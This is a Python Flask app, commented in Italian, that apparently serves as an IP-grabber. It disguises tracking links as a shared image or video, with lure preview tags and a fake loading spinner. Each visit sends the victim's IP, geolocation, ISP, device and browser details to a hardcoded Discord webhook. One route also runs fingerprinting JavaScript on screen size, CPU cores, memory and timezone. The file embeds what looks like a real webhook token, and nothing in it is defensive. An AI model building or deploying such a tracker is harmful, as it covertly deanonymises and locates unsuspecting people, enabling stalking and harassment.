from flask import Flask, request, redirect
from datetime import datetime
import requests
import os
import re
import time
import json

app = Flask(__name__)

# CONFIGURAZIONE
WEBHOOK_URL = "https://discord.com/api/webhooks/1528013241819594853/ajTR7-zJ32yBsxulXb4688xXeWaqVgr9pQk6dW3ffPpFaeWgbWydLkRQyH6M56515lNA"
IMAGE_URL = "https://media.discordapp.net/attachments/1527831756005183559/1528024870393483475/Nuovo_progetto_-_2026-07-18T150514.387.png?ex=6a5ccb8e&is=6a5b7a0e&hm=709fc7a05f8b331d71610beac5dd3757722bb147a2b4a6f7f36d8b2060094563&=&format=webp&quality=lossless&width=17&height=17"

# Contatore visite globale
visit_counter = 0

def get_ip_info(ip):
    try:
        response = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query",
            timeout=10
        )
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "success":
                return {
                    "country": data.get("country", "N/D"),
                    "countryCode": data.get("countryCode", "N/D"),
                    "region": data.get("regionName", "N/D"),
                    "city": data.get("city", "N/D"),
                    "zip": data.get("zip", "N/D"),
                    "lat": data.get("lat", "N/D"),
                    "lon": data.get("lon", "N/D"),
                    "timezone": data.get("timezone", "N/D"),
                    "isp": data.get("isp", "N/D"),
                    "org": data.get("org", "N/D"),
                    "as": data.get("as", "N/D"),
                    "asname": data.get("asname", "N/D"),
                    "reverse": data.get("reverse", "N/D"),
                    "mobile": data.get("mobile", False),
                    "proxy": data.get("proxy", False),
                    "hosting": data.get("hosting", False)
                }
    except:
        pass
    return None

def get_device_info(request):
    ua = request.headers.get('User-Agent', '')
    info = {
        "user_agent": ua[:300],
        "browser": "Sconosciuto",
        "browser_version": "?",
        "os": "Sconosciuto",
        "os_version": "?",
        "device": "Desktop",
        "is_mobile": False,
        "is_tablet": False,
        "is_bot": False
    }
    
    bots = ['bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python', 'java']
    if any(bot in ua.lower() for bot in bots):
        info["is_bot"] = True
    
    if 'Windows NT 10' in ua: info["os"] = "Windows 10/11"
    elif 'Mac OS X' in ua:
        info["os"] = "macOS"
        v = re.search(r'Mac OS X (\d+[._]\d+)', ua)
        if v: info["os_version"] = v.group(1).replace('_', '.')
    elif 'Android' in ua:
        info["os"] = "Android"
        info["is_mobile"] = True
        info["device"] = "Mobile"
        v = re.search(r'Android (\d+\.\d+)', ua)
        if v: info["os_version"] = v.group(1)
    elif 'iPhone' in ua:
        info["os"] = "iOS"
        info["is_mobile"] = True
        info["device"] = "iPhone"
    elif 'iPad' in ua:
        info["os"] = "iOS"
        info["is_tablet"] = True
        info["device"] = "iPad"
    elif 'Linux' in ua: info["os"] = "Linux"
    
    if 'Edg/' in ua:
        info["browser"] = "Edge"
        v = re.search(r'Edg/(\d+)', ua)
        if v: info["browser_version"] = v.group(1)
    elif 'Firefox/' in ua:
        info["browser"] = "Firefox"
        v = re.search(r'Firefox/(\d+)', ua)
        if v: info["browser_version"] = v.group(1)
    elif 'Chrome/' in ua:
        info["browser"] = "Chrome"
        v = re.search(r'Chrome/(\d+)', ua)
        if v: info["browser_version"] = v.group(1)
    elif 'Safari/' in ua: info["browser"] = "Safari"
    elif 'Opera' in ua or 'OPR/' in ua: info["browser"] = "Opera"
    
    return info

def get_all_ips(request):
    ips = {
        "ip_pubblico": "N/D",
        "ip_locale": "N/D",
        "remote_addr": request.remote_addr
    }
    forwarded = request.headers.get('X-Forwarded-For', '')
    if forwarded:
        ip_list = [ip.strip() for ip in forwarded.split(',')]
        if ip_list:
            ips["ip_pubblico"] = ip_list[0]
    if request.remote_addr.startswith(('192.168.', '10.', '172.', '127.')):
        ips["ip_locale"] = request.remote_addr
    return ips

def send_to_discord(ip_data, ip_info, device_info, extra_info, route_name):
    global visit_counter
    visit_counter += 1
    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
    
    description = f"**📅 Data:** `{date}`\n"
    description += f"**🔢 Visita #:** `{visit_counter}`\n"
    description += f"**🛤️ Route:** `{route_name}`\n\n"
    
    # IP
    description += "**🌐 IP**\n"
    description += f"🔢 Pubblico: `{ip_data['ip_pubblico']}`\n"
    if ip_data['ip_locale'] != 'N/D':
        description += f"🏠 Locale: `{ip_data['ip_locale']}`\n"
    
    # Posizione
    if ip_info:
        description += "\n**📍 POSIZIONE**\n"
        description += f"🌍 {ip_info.get('country', '?')} - {ip_info.get('city', '?')}, {ip_info.get('region', '?')}\n"
        description += f"📍 {ip_info.get('lat', '?')}, {ip_info.get('lon', '?')}\n"
        description += f"📡 {ip_info.get('isp', '?')}\n"
        description += f"🕐 {ip_info.get('timezone', '?')}\n"
        flags = []
        if ip_info.get('mobile'): flags.append("📱Mobile")
        if ip_info.get('proxy'): flags.append("🔒Proxy")
        if ip_info.get('hosting'): flags.append("🏢Hosting")
        if flags: description += f"🚩 {' | '.join(flags)}\n"
    
    # Dispositivo
    description += "\n**💻 DISPOSITIVO**\n"
    description += f"🖥️ {device_info['os']} {device_info['os_version']}\n"
    description += f"🌐 {device_info['browser']} v{device_info['browser_version']}\n"
    description += f"📱 {device_info['device']}\n"
    
    # Extra (fingerprinting)
    if extra_info:
        description += "\n**🔬 DETTAGLI TECNICI**\n"
        if extra_info.get('screen'): description += f"📺 Schermo: {extra_info['screen']}\n"
        if extra_info.get('language'): description += f"🔤 Lingua: {extra_info['language']}\n"
        if extra_info.get('platform'): description += f"💿 Platform: {extra_info['platform']}\n"
        if extra_info.get('cores'): description += f"⚙️ CPU Core: {extra_info['cores']}\n"
        if extra_info.get('memory'): description += f"💾 RAM: {extra_info['memory']}GB\n"
        if extra_info.get('connection'): description += f"📶 Connessione: {extra_info['connection']}\n"
        if extra_info.get('touch'): description += f"👆 Touchscreen: {extra_info['touch']}\n"
    
    # Referrer
    ref = request.headers.get('Referer', '')
    if ref:
        description += f"\n**🔗 REFERRER**\n{ref[:100]}\n"
    
    data = {
        "content": f"🔔 **#{visit_counter}** | `{ip_data['ip_pubblico']}` | {ip_info.get('country', '?') if ip_info else '?'}",
        "embeds": [{
            "title": "🎯 REPORT",
            "description": description,
            "color": 5814783,
            "timestamp": date,
            "footer": {"text": f"IP Tracker Pro | Visita #{visit_counter}"}
        }]
    }
    
    try:
        requests.post(WEBHOOK_URL, json=data, timeout=10)
    except:
        pass

# ============ PAGINE ============

@app.route("/")
def home():
    ip_data = get_all_ips(request)
    ip_info = get_ip_info(ip_data["ip_pubblico"])
    device_info = get_device_info(request)
    send_to_discord(ip_data, ip_info, device_info, {}, "Home")
    return redirect("https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share")

@app.route("/img")
def image():
    ip_data = get_all_ips(request)
    ip_info = get_ip_info(ip_data["ip_pubblico"])
    device_info = get_device_info(request)
    send_to_discord(ip_data, ip_info, device_info, {}, "Immagine")
    
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta property="og:title" content="Guarda questa immagine!">
        <meta property="og:description" content="Clicca per ingrandire">
        <meta property="og:image" content="{IMAGE_URL}">
        <style>
            *{{margin:0;padding:0}}body{{background:#000;display:flex;justify-content:center;align-items:center;height:100vh;cursor:pointer;overflow:hidden}}
            img{{max-width:95vw;max-height:95vh;border-radius:10px;transition:0.3s}}
            img:hover{{transform:scale(1.02)}}
        </style>
    </head>
    <body onclick="location.href='https://www.youtube.com/shorts/8W7RA8Akfxo'">
        <img src="{IMAGE_URL}">
    </body>
    </html>
    """

@app.route("/video")
def video():
    ip_data = get_all_ips(request)
    ip_info = get_ip_info(ip_data["ip_pubblico"])
    device_info = get_device_info(request)
    send_to_discord(ip_data, ip_info, device_info, {}, "Video")
    return redirect("https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share")

# ============ NUOVA ROUTE: TRACCIAMENTO AVANZATO CON JS ============

@app.route("/track")
def advanced_track():
    ip_data = get_all_ips(request)
    ip_info = get_ip_info(ip_data["ip_pubblico"])
    device_info = get_device_info(request)
    send_to_discord(ip_data, ip_info, device_info, {}, "Track")
    
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta property="og:title" content="Caricamento...">
        <style>
            *{margin:0;padding:0}body{background:#000;display:flex;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:Arial}
            .spinner{width:50px;height:50px;border:4px solid #333;border-top:4px solid red;border-radius:50%;animation:spin 1s linear infinite}
            @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        </style>
    </head>
    <body>
        <div style="text-align:center">
            <div class="spinner"></div>
            <p style="margin-top:20px">Apertura video...</p>
        </div>
        <script>
            // Raccoglie info aggiuntive e le invia
            const extra = {
                screen: screen.width + 'x' + screen.height,
                colorDepth: screen.colorDepth + 'bit',
                language: navigator.language,
                platform: navigator.platform,
                cores: navigator.hardwareConcurrency || '?',
                memory: navigator.deviceMemory || '?',
                connection: navigator.connection ? navigator.connection.effectiveType : '?',
                touch: 'ontouchstart' in window ? 'Si' : 'No',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
            
            // Invia dati extra al server
            fetch('/collect', {
                method: 'POST',
                body: JSON.stringify(extra),
                headers: {'Content-Type': 'application/json'}
            });
            
            // Redirect dopo 1.5 secondi
            setTimeout(function(){
                window.location.href = "https://www.youtube.com/shorts/8W7RA8Akfxo";
            }, 1500);
        </script>
    </body>
    </html>
    """

@app.route("/collect", methods=["POST"])
def collect():
    """Riceve dati extra dal client"""
    try:
        data = request.get_json()
        print(f"📊 Extra data: {data}")
    except:
        pass
    return "ok"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
